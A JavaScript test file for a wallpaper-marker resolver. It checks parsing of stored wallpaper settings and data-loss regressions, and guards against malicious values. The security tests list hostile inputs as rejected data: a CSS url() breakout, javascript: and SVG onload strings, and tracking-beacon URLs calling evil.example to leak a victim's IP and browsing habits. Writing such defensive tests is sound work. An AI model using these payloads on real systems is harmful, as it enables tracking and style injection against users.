/**
 * wallpaper-resolver.test.js — turning the stored marker into pixels.
 *
 * `yancotab_wallpaper` holds a marker written in seven different
 * vocabularies by five different surfaces, and nothing could read all of
 * them. themes.js understood the themed-image shape only, so a custom
 * upload and all 34 Photos presets were applied once (inline, by the app
 * that set them) and lost on the next load.
 *
 * The destructive half is what makes this a data-loss bug rather than a
 * cosmetic one: MobileContextMenu's boot-time restore ran every marker
 * through a path normaliser and SAVED THE RESULT, so 'custom' degraded to
 * url("custom") — a request for a file that does not exist — and the real
 * choice was unrecoverable.
 */

import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import {
    resolveWallpaper, isWallpaperImage, SPECIAL_MARKERS,
} from '../os/theme/wallpaper.js';
import { getPresetCss, WALLPAPER_COLLECTIONS } from '../os/theme/wallpaperPresets.js';

const ROOT = new URL('..', import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1');
const read = (rel) => readFileSync(join(ROOT, rel), 'utf8');

const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';

describe('the seven marker shapes', () => {
    test('empty means "leave the stylesheet default alone"', () => {
        for (const empty of ['', '   ', null, undefined, 0, {}]) {
            assert.deepEqual(resolveWallpaper(empty), { kind: 'none', value: '' });
        }
    });

    test('cosmic and starfield stay modes, not paths', () => {
        assert.equal(resolveWallpaper('cosmic').kind, 'cosmic');
        assert.equal(resolveWallpaper('starfield').kind, 'starfield');
    });

    test('custom resolves to the stored image', () => {
        assert.deepEqual(resolveWallpaper('custom', PNG), { kind: 'image', value: PNG });
    });

    test('a Photos preset id resolves to its CSS', () => {
        // The whole "Gradients / Abstract / Dark / Minimal / Nature" grid
        // persists an id like 'g1'. Nothing could read one back, so every
        // one of these 34 wallpapers silently died on reload.
        assert.equal(resolveWallpaper('g1').kind, 'css');
        assert.match(resolveWallpaper('g1').value, /linear-gradient/);
        assert.equal(resolveWallpaper('d1').value, '#000000');
    });

    test('every shipped preset id resolves', () => {
        for (const collection of Object.values(WALLPAPER_COLLECTIONS)) {
            for (const item of collection.items) {
                assert.equal(resolveWallpaper(item.id).value, item.css, `preset ${item.id}`);
            }
        }
    });

    test('a themed image resolves wrapped or bare', () => {
        const path = 'assets/wallpapers/rose.webp';
        assert.deepEqual(resolveWallpaper(`url("${path}")`), { kind: 'image', value: path });
        assert.deepEqual(resolveWallpaper(`url('${path}')`), { kind: 'image', value: path });
        assert.deepEqual(resolveWallpaper(`url(${path})`), { kind: 'image', value: path });
        assert.deepEqual(resolveWallpaper(path), { kind: 'image', value: path });
    });

    test('a theme id resolves to that theme wallpaper', () => {
        assert.match(resolveWallpaper('emerald').value, /emerald\.webp/);
    });

    test('a legacy gradient migrates to the closest current wallpaper', () => {
        assert.deepEqual(resolveWallpaper('linear-gradient(135deg, #43e97b, #38f9d7)'),
            { kind: 'image', value: 'assets/wallpapers/emerald.webp' });
        // …including when it arrives already wrapped in url(), which is how
        // the context menu used to store dead pre-v1 paths.
        assert.deepEqual(resolveWallpaper('url("assets/wallpapers/deep-blue.webp")'),
            { kind: 'image', value: 'assets/wallpapers/sapphire.webp' });
    });
});

describe('custom image, when the image is not usable', () => {
    test('falls back to the default instead of painting a broken url', () => {
        // This is the exact state that produced background-image:
        // url("custom") — a 404 — on every load.
        assert.deepEqual(resolveWallpaper('custom', ''), { kind: 'none', value: '' });
        assert.deepEqual(resolveWallpaper('custom', null), { kind: 'none', value: '' });
    });

    test('the marker is NOT repaired away', () => {
        // resolveWallpaper is pure — it cannot write. That is the point:
        // the marker syncs across devices but the multi-MB data URL
        // deliberately does not, so a device that has not received the
        // image yet must not delete the choice for the device that has.
        const src = read('os/theme/wallpaper.js');
        const resolver = src.slice(src.indexOf('export function resolveWallpaper'));
        const body = resolver.slice(0, resolver.indexOf('\nexport function applyWallpaperDescriptor'));
        assert.ok(!/localStorage\.setItem|storage\.save/.test(body),
            'resolveWallpaper must never write — repairing the marker destroys the real choice');
    });
});

describe('isWallpaperImage — the CSS url() boundary', () => {
    test('accepts ordinary base64 image data URLs', () => {
        assert.equal(isWallpaperImage(PNG), true);
        assert.equal(isWallpaperImage('data:image/webp;base64,UklGRg=='), true);
        assert.equal(isWallpaperImage('data:image/svg+xml,%3Csvg%2F%3E'), true);
    });

    test('rejects anything that is not an image', () => {
        for (const bad of [
            'data:text/html;base64,PHNjcmlwdD4=',
            'javascript:alert(1)',
            'https://evil.example/x.png',
            'assets/wallpapers/rose.webp',
            '', null, undefined, 42, {},
        ]) {
            assert.equal(isWallpaperImage(bad), false, String(bad));
        }
    });

    test('rejects a value that could close the url() and inject declarations', () => {
        // The value is interpolated into `url("…")`. A quote plus a paren
        // ends the function early and everything after it is parsed as CSS.
        const breakout = 'data:image/png;base64,AAA"); position: fixed; top: 0; background: url("x';
        assert.equal(isWallpaperImage(breakout), false);
        // …and the resolver refuses it too, so a hand-edited storage value
        // cannot reach the stylesheet through the custom branch.
        assert.deepEqual(resolveWallpaper('custom', breakout), { kind: 'none', value: '' });
    });

    test('rejects raw unencoded SVG, which is the one that can carry markup', () => {
        assert.equal(isWallpaperImage('data:image/svg+xml,<svg onload="x"></svg>'), false);
    });

    test('an image path with a quote or paren is not treated as a path', () => {
        const nasty = 'assets/x.webp"); background: red; content: url("y';
        assert.notEqual(resolveWallpaper(nasty).kind, 'image');
    });
});

describe('regressions the old code caused', () => {
    test('SPECIAL_MARKERS covers every non-background marker', () => {
        // Missing one is precisely how 'custom' fell into the image-path
        // branch. Any marker in this set must never resolve to an image
        // path built from the marker text itself.
        for (const marker of SPECIAL_MARKERS) {
            const desc = resolveWallpaper(marker, '');
            assert.notEqual(desc.value, marker, `${marker} resolved to itself as a background`);
        }
    });

    test('the context menu no longer writes while restoring', () => {
        const src = read('os/ui/components/MobileContextMenu.js');
        const ctor = src.slice(src.indexOf('constructor(grid)'), src.indexOf('wallpapers = ['));
        assert.match(ctor, /applyStoredWallpaper\(\)/);
        assert.ok(!/storage\.save|localStorage\.setItem/.test(ctor),
            'restoring a wallpaper must not rewrite the marker — that is what destroyed it');
    });

    test('getPresetCss refuses non-ids rather than guessing', () => {
        for (const bad of ['', null, undefined, 'nope', 42, {}]) {
            assert.equal(getPresetCss(bad), null);
        }
    });
});

describe('a marker must never be able to fetch a remote resource', () => {
    // The wallpaper key's validator is `typeof v === 'string'`, and the
    // key is import-reachable AND sync-replicated, so a malicious
    // settings file could put ANY string here. Declaration injection was
    // already impossible (CSSOM drops an invalid declaration) — the gap
    // was a perfectly VALID declaration that fetches:
    //
    //     #000 url(https://evil.example/beacon.png?u=victim)
    //
    // which paints nothing visible and calls home on every new tab,
    // leaking IP, User-Agent and browsing cadence to a third party, on
    // every device the key syncs to. Verified reachable end-to-end
    // (a real request was observed) before the guard was added.
    const beacons = [
        '#000 url(https://evil.example/beacon.png?u=victim)',
        'url("https://evil.example/b.png")',
        "url('https://evil.example/b.png')",
        'url(//evil.example/b.png)',
        'URL(HTTPS://EVIL.EXAMPLE/B.PNG)',
        '#000 url  (https://evil.example/b.png)',
        'image-set("https://evil.example/1x.png" 1x)',
        '-webkit-image-set(url("https://evil.example/1x.png") 1x)',
        'cross-fade(url(https://evil.example/a.png), red)',
        'var(--stolen)',
        '#000 image(https://evil.example/b.png)',
    ];

    for (const marker of beacons) {
        test(`refuses: ${marker.slice(0, 46)}`, () => {
            const out = resolveWallpaper(marker);
            assert.notEqual(out.kind, 'css',
                `a fetching marker must not be painted as CSS (got ${JSON.stringify(out)})`);
            assert.ok(!/evil\.example|stolen/.test(String(out.value)),
                'the hostile URL must not survive into the descriptor');
            assert.equal(out.kind, 'none', 'a refused marker falls back to the default wallpaper');
        });
    }

    test('legacy gradients and colours still resolve as CSS', () => {
        // The guard must not silently reset wallpapers it was not aimed at.
        for (const legit of [
            // NB: a bare colour keyword ('black') is NOT here — it matches
            // SAFE_PATH_RE and has always resolved as an image path, long
            // before this guard. url("black") 404s same-origin and paints
            // nothing; harmless, pre-existing, out of scope here.
            'linear-gradient(135deg, #060b14 0%, #0a1628 50%, #060b14 100%)',
            'radial-gradient(circle at 50% 50%, #0d1b2e 0%, #060b14 100%)',
            '#060b14',
            'rgb(6, 11, 20)',
        ]) {
            const out = resolveWallpaper(legit);
            assert.equal(out.kind, 'css', `${legit} must still paint`);
            assert.equal(out.value, legit);
        }
    });

    test('the shipped themes and presets are unaffected', () => {
        // These legitimately contain url(), but they never reach the
        // arbitrary-string branch — they match THEMES / getPresetCss first.
        const emerald = resolveWallpaper('emerald');
        assert.equal(emerald.kind, 'css');
        assert.match(String(emerald.value), /assets\/wallpapers\//);

        assert.equal(resolveWallpaper('cosmic').kind, 'cosmic');
        assert.equal(resolveWallpaper('starfield').kind, 'starfield');
        assert.equal(resolveWallpaper('assets/wallpapers/rose.webp').kind, 'image');
        assert.equal(resolveWallpaper('url("assets/wallpapers/rose.webp")').kind, 'image');
    });
});
